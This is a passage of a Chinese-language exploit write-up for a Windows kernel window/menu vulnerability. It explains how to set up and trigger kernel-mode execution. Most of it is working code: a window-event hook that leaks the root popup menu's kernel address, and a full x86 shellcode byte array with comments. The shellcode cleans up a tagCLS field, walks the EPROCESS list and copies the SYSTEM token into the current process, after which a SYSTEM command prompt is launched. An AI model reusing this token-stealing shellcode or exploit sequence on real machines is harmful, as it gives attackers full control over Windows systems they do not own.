我们需要在 ShellCode 代码中将目标窗口类对象的成员域 lpszMenuName
置空。我们需要在批量创建窗口的时候将每一个窗口的成员域pcls指向地址保存起来。
    VOID CALLBACK
    xxWindowEventProc(
        HWINEVENTHOOK hWinEventHook,
        DWORD         event,
        HWND          hwnd,
        LONG          idObject,
        LONG          idChild,
        DWORD         idEventThread,
        DWORD         dwmsEventTime
    )
    {
        if (iMenuCreated == 0)
        {
            popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
        }
        if (++iMenuCreated >= 2)
        {
            SendMessageW(hwnd, MN_ENDMENU, 0, 0);
        }
        else
        {
            SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
        }
    }
查找需置空成员域IpszMenuName的目标窗口类对象需要与根弹出菜单对象的内核地址进行匹配，这一步我们可以在`xxxWindowEventProc`函数中实现。  
接着构造payload，在准备工作中，我们就将`xxPayloadWindProc` 的代码拷贝到 SHELLCODE
对象缓冲区中。不同于用户模式的消息处理函数，内核模式窗口对象处理函数的第一个参数是指向目标窗口tagWND的指针，其余相同。
    // Arguments:
    // [ebp+08h]:pwnd   = pwndWindowHunt;
    // [ebp+0Ch]:msg    = 0x9F9F;
    // [ebp+10h]:wParam = popupMenuRoot;
    // [ebp+14h]:lParam = NULL;
    // In kernel-mode, the first argument is tagWND pwnd.
    static
    BYTE
    xxPayloadWindProc[] = {
        // Loader+0x108a:
        // Judge if the `msg` is 0x9f9f value.
        0x55,                               // push    ebp
        0x8b, 0xec,                         // mov     ebp,esp
        0x8b, 0x45, 0x0c,                   // mov     eax,dword ptr [ebp+0Ch]
        0x3d, 0x9f, 0x9f, 0x00, 0x00,       // cmp     eax,9F9Fh
        0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, // jne     Loader+0x1128
        // Loader+0x109b:
        // Judge if CS is 0x1b, which means in user-mode context.
        0x66, 0x8c, 0xc8,                   // mov     ax,cs
        0x66, 0x83, 0xf8, 0x1b,             // cmp     ax,1Bh
        0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, // je      Loader+0x1128
        // Loader+0x10a8:
        // Get the address of pwndWindowHunt to ECX.
        // Recover the flags of pwndWindowHunt: zero bServerSideWindowProc.
        // Get the address of pvShellCode to EDX by CALL-POP.
        // Get the address of pvShellCode->tagCLS[0x100] to ESI.
        // Get the address of popupMenuRoot to EDI.
        0xfc,                               // cld
        0x8b, 0x4d, 0x08,                   // mov     ecx,dword ptr [ebp+8]
        0xff, 0x41, 0x16,                   // inc     dword ptr [ecx+16h]
        0x60,                               // pushad
        0xe8, 0x00, 0x00, 0x00, 0x00,       // call    $5
        0x5a,                               // pop     edx
        0x81, 0xea, 0x43, 0x04, 0x00, 0x00, // sub     edx,443h
        0xbb, 0x00, 0x01, 0x00, 0x00,       // mov     ebx,100h
        0x8d, 0x72, 0x18,                   // lea     esi,[edx+18h]
        0x8b, 0x7d, 0x10,                   // mov     edi,dword ptr [ebp+10h]
        // Loader+0x10c7:
        0x85, 0xdb,                         // test    ebx,ebx
        0x74, 0x13,                         // je      Loader+0x10de
        // Loader+0x10cb:
        // Judge if pvShellCode->tagCLS[ebx] == NULL
        0xad,                               // lods    dword ptr [esi]
        0x4b,                               // dec     ebx
        0x83, 0xf8, 0x00,                   // cmp     eax,0
        0x74, 0xf5,                         // je      Loader+0x10c7
        // Loader+0x10d2:
        // Judge if tagCLS->lpszMenuName == popupMenuRoot
        0x03, 0x42, 0x08,                   // add     eax,dword ptr [edx+8]
        0x39, 0x38,                         // cmp     dword ptr [eax],edi
        0x75, 0xee,                         // jne     Loader+0x10c7
        // Loader+0x10d9:
        // Zero tagCLS->lpszMenuName
        0x83, 0x20, 0x00,                   // and     dword ptr [eax],0
        0xeb, 0xe9,                         // jmp     Loader+0x10c7
        // Loader+0x10de:
        // Get the value of pwndWindowHunt->head.pti->ppi->Process to ECX.
        // Get the value of pvShellCode->pid to EAX.
        0x8b, 0x49, 0x08,                   // mov     ecx,dword ptr [ecx+8]
        0x8b, 0x5a, 0x0c,                   // mov     ebx,dword ptr [edx+0Ch]
        0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
        0x8b, 0x09,                         // mov     ecx,dword ptr [ecx]
        0x8b, 0x5a, 0x10,                   // mov     ebx,dword ptr [edx+10h]
        0x8b, 0x42, 0x04,                   // mov     eax,dword ptr [edx+4]
        0x51,                               // push    ecx
        // Loader+0x10f0:
        // Judge if EPROCESS->UniqueId == pid.
        0x39, 0x44, 0x0b, 0xfc,             // cmp     dword ptr [ebx+ecx-4],eax
        0x74, 0x07,                         // je      Loader+0x10fd
        // Loader+0x10f6:
        // Get next EPROCESS to ECX by ActiveLink.
        0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
        0x2b, 0xcb,                         // sub     ecx,ebx
        0xeb, 0xf3,                         // jmp     Loader+0x10f0
        // Loader+0x10fd:
        // Get current EPROCESS to EDI.
        0x8b, 0xf9,                         // mov     edi,ecx
        0x59,                               // pop     ecx
        // Loader+0x1100:
        // Judge if EPROCESS->UniqueId == 4
        0x83, 0x7c, 0x0b, 0xfc, 0x04,       // cmp     dword ptr [ebx+ecx-4],4
        0x74, 0x07,                         // je      Loader+0x110e
        // Loader+0x1107:
        // Get next EPROCESS to ECX by ActiveLink.
        0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
        0x2b, 0xcb,                         // sub     ecx,ebx
        0xeb, 0xf2,                         // jmp     Loader+0x1100
        // Loader+0x110e:
        // Get system EPROCESS to ESI.
        // Get the value of system EPROCESS->Token to current EPROCESS->Token.
        // Add 2 to OBJECT_HEADER->PointerCount of system Token.
        // Return 0x9F9F to the caller.
        0x8b, 0xf1,                         // mov     esi,ecx
        0x8b, 0x42, 0x14,                   // mov     eax,dword ptr [edx+14h]
        0x03, 0xf0,                         // add     esi,eax
        0x03, 0xf8,                         // add     edi,eax
        0xad,                               // lods    dword ptr [esi]
        0xab,                               // stos    dword ptr es:[edi]
        0x83, 0xe0, 0xf8,                   // and     eax,0FFFFFFF8h
        0x83, 0x40, 0xe8, 0x02,             // add     dword ptr [eax-18h],2
        0x61,                               // popad
        0xb8, 0x9f, 0x9f, 0x00, 0x00,       // mov     eax,9F9Fh
        0xeb, 0x05,                         // jmp     Loader+0x112d
        // Loader+0x1128:
        // Failed in processing.
        0xb8, 0x01, 0x00, 0x00, 0x00,       // mov     eax,1
        // Loader+0x112d:
        0xc9,                               // leave
        0xc2, 0x10, 0x00,                   // ret     10h
    };
  1. 判断传入的消息是否为0x9F9F。
  2. 将匹配到的 tagCLS 对象的成员域 lpszMenuName 置空。
  3. 当前进程和 System 进程的进程体对象地址，并修改当前进程的Token为System进程的Token。
  4. 恢复前面备份的通用寄存器的数值到寄存器中，并赋值返回值为 0x9F9F 作为向调用者的反馈信息。
    LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
    bDoneExploit = Triggered == 0x9F9F;
SHELLCODE已经布置好了，接下来在自定义阴影窗口消息处理函数中调用系统服务 `NtUserMNDragLeave`
并且对载体窗口对象发送自定义提权消息 `0x9F9F`
的调用语句，返回结果保存在bDoneExploit中。这样，如果主线程监听到bDoneExploit被成功赋值的话就创建新的CMD。